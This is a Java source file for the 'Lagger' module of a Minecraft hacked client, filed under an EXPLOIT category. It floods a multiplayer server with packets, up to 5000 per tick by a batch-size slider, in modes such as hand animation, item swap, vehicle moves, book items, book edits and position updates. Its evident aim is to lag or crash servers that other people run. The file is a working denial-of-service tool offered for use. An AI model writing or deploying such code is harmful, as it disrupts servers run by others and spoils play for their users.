package io.ace.nordclient.hacks.exploit;

import io.ace.nordclient.hacks.Hack;
import io.ace.nordclient.settings.SettingBase;
import io.ace.nordclient.settings.SettingMode;
import io.ace.nordclient.settings.SettingSlider;
import net.minecraft.client.gui.screen.EditBookScreen;
import net.minecraft.entity.Entity;
import net.minecraft.inventory.container.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.play.client.*;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;

import java.util.Arrays;
import java.util.List;

public class Lagger extends Hack {

    /**
     * @author Fleyr_
     */

    private static final List<SettingBase> settings = Arrays.asList(new SettingMode("Mode: ", "Animation", "Swap", "Entity", "Book", "BookMove", "BookSpam", "Open", "Position"), new SettingSlider(1, 5000, 5, 1, "BatchSize"));

    public Lagger() {
        super("Lagger", Category.EXPLOIT, 2231666, settings);
    }

    @Override
    public void onUpdate() {
        switch (this.getSettings().get(0).toMode().getModeValue(getSettings().get(0).toMode().mode).toUpperCase()) {
            case "ANIMATION":
                for (int i = 0; i < settings.get(1).toSlider().getValue(); i++) {
                    mc.player.connection.sendPacket(new CAnimateHandPacket(Hand.MAIN_HAND));
                }
                break;
            case "SWAP":
                for (int i = 0; i < settings.get(1).toSlider().getValue(); i++) {
                    mc.player.connection.sendPacket(
                            new CPlayerDiggingPacket(CPlayerDiggingPacket.Action.SWAP_ITEM_WITH_OFFHAND,
                                    BlockPos.ZERO, mc.player.getHorizontalFacing()));
                }
                break;
            case "ENTITY":
                for (int i = 0; i < settings.get(1).toSlider().getValue(); i++) {
                    final Entity riding = mc.player.getRidingEntity();
                    if (riding != null) {
                        riding.setPosition(mc.player.getPosX(), mc.player.getPosY() + 1337, mc.player.getPosZ());
                        mc.player.connection.sendPacket(new CMoveVehiclePacket(riding));
                    }
                }
                break;

            case "BOOK":
            case "BOOKMOVE":
                final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                //final NBTCompoundTagArgument pages = new NBTCompoundTagArgument();

                for (int page = 0; page < 50; page++) {
                    //pages.appendTag(new NBTTagString("192i9i1jr1fj8fj893fj84ujv8924jv2j4c8j248vj2498u2-894u10fuj0jhv20j204uv902jv90j209vj204vj"));
                }

                //final NBTCompoundTagArgument tag = new NBTCompoundTagArgument();
               // tag.setString("author", mc.player.getName());
                //tag.setString("title", "I think you need better plugins");
                //tag.setTag("pages", pages);
                //itemStack.setTagCompound(tag);

                for (int i = 0; i < settings.get(1).toSlider().getValue(); i++) {
                    if (this.getSettings().get(0).toMode().getModeValue(getSettings().get(0).toMode().mode).equalsIgnoreCase("book"))
                        mc.player.connection.sendPacket(new CCreativeInventoryActionPacket(0, itemStack));
                    else if (this.getSettings().get(0).toMode().getModeValue(getSettings().get(0).toMode().mode).equalsIgnoreCase("bookmove"))
                        mc.player.connection.sendPacket(new CClickWindowPacket(0, 0, 0,
                                ClickType.PICKUP, itemStack, (short) 0));
                }
                break;
            /**
             * @author Ace_______
             */
            case "BOOKSPAM":

                for (int i = 0; i < settings.get(1).toSlider().getValue(); i++) {
                    if (mc.currentScreen instanceof EditBookScreen) {
                        mc.player.connection.sendPacket(new CEditBookPacket(mc.player.getHeldItemMainhand(), true, 0));
                    }
                    // if (mc.currentScreen instanceof GuiScreenBook)
                    // mc.player.closeScreen();

                }
                break;
            case "OPEN":
                for (int i = 0; i < settings.get(1).toSlider().getValue(); i++) {
                    mc.player.connection.sendPacket(new CPlayerTryUseItemPacket(Hand.MAIN_HAND));
                }
                break;
            case "POSITION":
                for (int i = 0; i < settings.get(1).toSlider().getValue(); i++) {
                    mc.player.connection.sendPacket(new CPlayerPacket.PositionRotationPacket(mc.player.getPosX(), mc.player.getPosY(), mc.player.getPosZ(), 0, 0, mc.player.isOnGround()));
                }
                break;
        }

    }
    //
}

